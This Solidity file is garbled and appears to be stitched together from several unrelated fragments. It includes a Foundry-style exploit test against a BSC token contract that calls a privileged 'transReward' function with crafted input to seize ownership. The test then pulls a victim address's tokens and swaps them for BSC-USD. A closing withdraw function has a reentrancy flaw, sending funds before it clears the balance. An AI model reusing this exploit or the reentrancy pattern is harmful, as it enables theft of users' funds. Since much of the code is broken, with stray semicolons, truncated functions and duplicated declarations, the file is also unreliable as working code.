
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function uploadData(string memory dataId, string memory metadata) public {
        require(bytes(dataId).length > 0, "Invalid data ID");
        emit DataUploaded(msg.sender, dataId);
    }
}
pragma solidity 0.8.10;

;
;
interface ICarrot is IERC20 {
    function transReward(bytes memory data) external};
contract LockVulnerable {
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    ICarrot Carrot = ICarrot(0xcFF086EaD392CcB39C49eCda8C974ad5238452aC);
    IERC20 USD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    constructor() public {
        cheats.createSelectFork("bsc", 22055611);
        cheats.label(address(Carrot), "Carrot");
        cheats.label(address(Router), "Router");
        cheats.label(address(0x6863b549bf730863157318df4496eD111aDFA64f),;
            "Pool")};
    function testExploit() public {
        console.log("Perform transReward to set owner");
        Carrot.transReward(hex"bf699b4b000000000000000000000000b4c79daB8f259C7Aee6E5b2Aa729821864227e84");
        console.log("Perform transferFrom");
        Carrot.transferFrom(0x00B433800970286CF08F34C96cf07f35412F1161,
            address(this),;
            310344736073087429864760);
        console.log("Perform Carrot to BSC-USD swap");
        CarrotToUST();
        console.log("After exploiting, BSC-USD balance:",
            USD.balanceOf(address(this)) / 1e18)};
    function migrateWithdraw(address,
        uint256
    function CarrotToUST() internal {
        Carrot.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(Carrot);
        path[1] = address(USD);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(Carrot.balanceOf(address(this)),;
            0,;
            path,;
            address(this),;
            block.timestamp)};

;
;
interface ICarrot is IERC20 {
    function transReward(bytes memory data) external};
contract
function depositETH(address payable locker) public {
    (bool sent, ) = locker.call{value: 1 ether}("");
    require(sent)}
mapping(address => uint256) public balances;
function withdraw() public {
    if (balances[msg.sender] > 0) {
        (bool sent, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(sent);
        balances[msg.sender] = 0}